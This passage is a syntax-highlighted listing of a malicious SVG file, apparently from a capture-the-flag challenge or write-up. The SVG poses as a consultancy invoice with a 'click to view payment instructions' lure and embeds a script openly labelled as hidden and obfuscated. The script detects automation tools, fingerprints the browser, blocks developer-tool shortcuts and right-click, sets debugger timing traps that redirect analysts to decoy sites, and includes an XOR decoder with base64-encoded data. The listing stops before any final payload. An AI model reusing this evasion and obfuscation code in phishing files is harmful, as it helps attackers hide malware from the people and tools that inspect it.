class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span> <span class="attr">text-anchor</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;24&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#212529&quot;</span>&gt;</span>INVOICE #2025-0727<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;130&quot;</span> <span class="attr">text-anchor</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#6c757d&quot;</span>&gt;</span>Payment Due: August 15, 2025<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Company info --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;180&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>From:<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;200&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>TechSolutions Corp<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;220&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>123 Business Ave<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;240&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>New York, NY 10001<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;180&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>To:<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;200&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Your Company<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;220&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>456 Client Street<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;240&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Boston, MA 02101<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Invoice details --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y1</span>=<span class="string">&quot;280&quot;</span> <span class="attr">x2</span>=<span class="string">&quot;720&quot;</span> <span class="attr">y2</span>=<span class="string">&quot;280&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#dee2e6&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;310&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;500&quot;</span> <span class="attr">y</span>=<span class="string">&quot;310&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Amount<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;340&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>IT Security Consultation<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;500&quot;</span> <span class="attr">y</span>=<span class="string">&quot;340&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>$2,500.00<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;80&quot;</span> <span class="attr">y</span>=<span class="string">&quot;370&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Network Assessment<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;500&quot;</span> <span class="attr">y</span>=<span class="string">&quot;370&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;14&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>$1,800.00<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">&quot;450&quot;</span> <span class="attr">y1</span>=<span class="string">&quot;400&quot;</span> <span class="attr">x2</span>=<span class="string">&quot;720&quot;</span> <span class="attr">y2</span>=<span class="string">&quot;400&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#dee2e6&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;500&quot;</span> <span class="attr">y</span>=<span class="string">&quot;430&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">font-weight</span>=<span class="string">&quot;bold&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#495057&quot;</span>&gt;</span>Total: $4,300.00<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;400&quot;</span> <span class="attr">y</span>=<span class="string">&quot;480&quot;</span> <span class="attr">text-anchor</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">font-family</span>=<span class="string">&quot;Arial&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;12&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#dc3545&quot;</span>&gt;</span></span><br><span class="line">    Please click to view detailed payment instructions</span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Hidden malicious script with multiple layers of obfuscation --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">&lt;![<span class="variable constant_">CDATA</span>[</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Anti-debugging and detection evasion</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> jXKuzdDMGk = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> detectionBypass = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> globalSeed = <span class="number">0x5A4D</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> entropy = [];</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Advanced fingerprinting and detection evasion</span></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">function</span> <span class="title function_">antiDetection</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Check for WebDriver, PhantomJS, Burp Suite</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (navigator.<span class="property">webdriver</span> || <span class="variable language_">window</span>.<span class="property">callPhantom</span> || <span class="variable language_">window</span>.<span class="property">_phantom</span> || </span></span><br><span class="line"><span class="language-javascript">          navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Burp&quot;</span>) || navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;HeadlessChrome&quot;</span>) ||</span></span><br><span class="line"><span class="language-javascript">          navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Selenium&quot;</span>) || <span class="variable language_">window</span>.<span class="property">chrome</span> &amp;&amp; chrome.<span class="property">runtime</span> &amp;&amp; chrome.<span class="property">runtime</span>.<span class="property">onConnect</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;about:blank&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Advanced environment fingerprinting</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="property">textBaseline</span> = <span class="string">&#x27;top&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="property">font</span> = <span class="string">&#x27;14px Arial&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      ctx.<span class="title function_">fillText</span>(<span class="string">&#x27;Browser fingerprint test&#x27;</span>, <span class="number">2</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> fingerprint = canvas.<span class="title function_">toDataURL</span>();</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Generate entropy from browser characteristics</span></span></span><br><span class="line"><span class="language-javascript">      entropy = [</span></span><br><span class="line"><span class="language-javascript">        navigator.<span class="property">hardwareConcurrency</span> || <span class="number">4</span>,</span></span><br><span class="line"><span class="language-javascript">        screen.<span class="property">colorDepth</span>,</span></span><br><span class="line"><span class="language-javascript">        screen.<span class="property">pixelDepth</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>(),</span></span><br><span class="line"><span class="language-javascript">        fingerprint.<span class="property">length</span>,</span></span><br><span class="line"><span class="language-javascript">        navigator.<span class="property">language</span>.<span class="property">length</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span> * <span class="number">1000</span> | <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">      ];</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Check for debugging environment indicators</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span> || </span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">200</span> ||</span></span><br><span class="line"><span class="language-javascript">          fingerprint.<span class="property">length</span> &lt; <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        detectionBypass = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Generate seed from entropy</span></span></span><br><span class="line"><span class="language-javascript">      globalSeed = entropy.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">acc, val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> ((acc &lt;&lt; <span class="number">5</span>) - acc + val) &amp; <span class="number">0xFFFFFFFF</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">0x5A4D</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)();</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Block developer tools shortcuts</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> blockedKeys = [</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">keyCode</span>: <span class="number">123</span> &#125;, <span class="comment">// F12</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125;, <span class="comment">// Ctrl + U</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Ctrl + Shift + I</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">67</span> &#125;, <span class="comment">// Ctrl + Shift + C</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">74</span> &#125;, <span class="comment">// Ctrl + Shift + J</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">75</span> &#125;, <span class="comment">// Ctrl + Shift + K</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">alt</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Cmd + Alt + I (Mac)</span></span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125; <span class="comment">// Cmd + U (Mac)</span></span></span><br><span class="line"><span class="language-javascript">      ];</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> isBlocked = blockedKeys.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> (!key.<span class="property">ctrl</span> || event.<span class="property">ctrlKey</span>) &amp;&amp;</span></span><br><span class="line"><span class="language-javascript">               (!key.<span class="property">shift</span> || event.<span class="property">shiftKey</span>) &amp;&amp;</span></span><br><span class="line"><span class="language-javascript">               (!key.<span class="property">meta</span> || event.<span class="property">metaKey</span>) &amp;&amp;</span></span><br><span class="line"><span class="language-javascript">               (!key.<span class="property">alt</span> || event.<span class="property">altKey</span>) &amp;&amp;</span></span><br><span class="line"><span class="language-javascript">               event.<span class="property">keyCode</span> === key.<span class="property">keyCode</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (isBlocked) &#123;</span></span><br><span class="line"><span class="language-javascript">        event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Block right-click context menu</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;contextmenu&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      event.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Advanced anti-debugging using performance timing with variable thresholds</span></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">function</span> <span class="title function_">timingCheck</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> baseThreshold = <span class="number">50</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> dynamicThreshold = baseThreshold + (globalSeed % <span class="number">100</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> checkCount = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> start = performance.<span class="title function_">now</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">debugger</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> end = performance.<span class="title function_">now</span>();</span></span><br><span class="line"><span class="language-javascript">        checkCount++;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Variable threshold based on environment</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> currentThreshold = dynamicThreshold + (checkCount * <span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (end - start &gt; currentThreshold &amp;&amp; detectionBypass) &#123;</span></span><br><span class="line"><span class="language-javascript">          jXKuzdDMGk = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// Redirect with multiple decoy destinations</span></span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> decoyUrls = [<span class="string">&#x27;https://www.google.com&#x27;</span>, <span class="string">&#x27;https://www.microsoft.com&#x27;</span>, <span class="string">&#x27;about:blank&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(decoyUrls[globalSeed % decoyUrls.<span class="property">length</span>]);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">150</span> + (globalSeed % <span class="number">100</span>));</span></span><br><span class="line"><span class="language-javascript">    &#125;)();</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">customPRNG</span>(<span class="params">seed</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> m = <span class="number">0x80000000</span>; <span class="comment">// 2**31</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> a = <span class="number">1103515245</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> c = <span class="number">12345</span>;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      seed = (a * seed + c) % m;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> seed / (m - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">advancedXOR</span>(<span class="params">data, keyBase</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> expandedKey = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> keyChar = keyBase.<span class="title function_">charCodeAt</span>(i % keyBase.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> entropyVal = entropy[i % entropy.<span class="property">length</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> rotatedKey = ((keyChar ^ entropyVal) + globalSeed) % <span class="number">256</span>;</span></span><br><span class="line"><span class="language-javascript">        expandedKey += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(rotatedKey);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; data.<span class="property">length</span>; j++) &#123;</span></span><br><span class="line"><span class="language-javascript">        result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(data.<span class="title function_">charCodeAt</span>(j) ^ expandedKey.<span class="title function_">charCodeAt</span>(j));</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> result;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Main payload - heavily obfuscated with multiple transformation layers</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (!jXKuzdDMGk &amp;&amp; detectionBypass) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> decoyArray1 = [<span class="number">119</span>,<span class="number">109</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">125</span>]; <span class="comment">// wmctf&#123;fake_flag&#125;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> decoyArray2 = [<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>];</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> polymorphicData = [</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;V01DVEZbZmFrZV9mbGFnXQ==&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;bm90X3RoZV9yZWFsX2ZsYWc=&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;ZGVjb3lfZGF0YQ==&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        ];</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Layer 3: Environmental validation with complex checks</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> envValidation = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> checks = [</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> <span class="variable language_">window</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> <span class="variable language_">document</span> !== <span class="string">&#x27;undefined&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            navigator.<span class="property">userAgent</span>.<span class="property">length</span> &gt; <span class="number">10</span>,</span></span><br><span class="line"><span class="language-javascript">            screen.<span class="property">width</span> &gt; <span class="number">0</span> &amp;&amp; screen.<span class="property">height</span> &gt; <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Date</span>.<span class="title function_">now</span>() &gt; <span class="number">1700000000000</span>, <span class="comment">// After 2023</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Math</span>.<span class="title function_">abs</span>(<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>()) &lt; <span class="number">1440</span>, <span class="comment">// Valid timezone</span></span></span><br><span class="line"><span class="language-javascript">            entropy.<span class="property">length</span> === <span class="number">7</span>,</span></span><br><span class="line"><span class="language-javascript">            globalSeed !== <span class="number">0x5A4D</span> <span class="comment">// Should be 